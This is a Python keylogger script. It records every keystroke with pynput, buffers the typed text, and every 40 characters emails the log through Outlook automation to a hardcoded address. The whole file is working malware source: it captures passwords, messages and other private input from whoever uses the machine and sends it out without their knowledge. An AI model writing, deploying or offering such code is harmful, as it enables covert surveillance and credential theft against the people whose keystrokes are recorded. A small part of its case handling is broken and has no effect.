# for mapping keystrokes to the operating system
from pynput.keyboard import Key, Listener 

# to enable outlook mail communication through python
from win32com import client
import pythoncom

# to get the current date and time
from datetime import datetime

# initializations
complete_log = 'INFORMATION LOGGED BY KEYLOGGER:\n'
word = ''
mail_char_limit = 40

# sending a mail containing the logged keystrokes to ourselves
def send_mail():
    outlook = client.Dispatch('outlook.application', pythoncom.CoInitialize())
    namespace = outlook.GetNameSpace('MAPI')
    mail = outlook.CreateItem(0)
    mail.Subject = 'Keylogger Logs - ' + datetime.now().strftime('%#d %b %Y %H:%M')
    mail.To = 'isaakeylogger@outlook.com'
    mail.Body = complete_log
    mail._oleobj_.Invoke(*(64209, 0, 8, 0, namespace.Accounts.Item('isaakeylogger@outlook.com')))
    mail.Send()

# catch keystrokes as they are pressed
def logKeys(key):
    global word
    global complete_log
    global mail_char_limit
    
    # exit control for the function
    if key==Key.esc:
        return False    

    # if a space or return tab is caught        
    if key==Key.space:
        word += ' '
        complete_log += word
        word = ''
        if len(complete_log)>=mail_char_limit:
            send_mail()
            complete_log = 'INFORMATION LOGGED BY KEYLOGGER:\n'    
    
    # if a return tab is logged
    elif key==Key.enter or key==Key.tab:
        word += '\n'
        complete_log += word
        word = ''
        if len(complete_log)>=mail_char_limit:
            send_mail()
            complete_log = 'INFORMATION LOGGED BY KEYLOGGER:\n'    

    # if user presses backspace key
    elif key==Key.backspace:
        word = word[:-1]
    
    # otherwise log the corresponding key
    elif key!=Key.shift and key!=Key.alt:
        if Key.shift==1 or Key.caps_lock==1:
            key.upper()
        ch = f'{key}'
        ch = ch[1:-1]
        word += ch


# entry control for the program
with Listener(on_press=logKeys) as listener:
    listener.join()
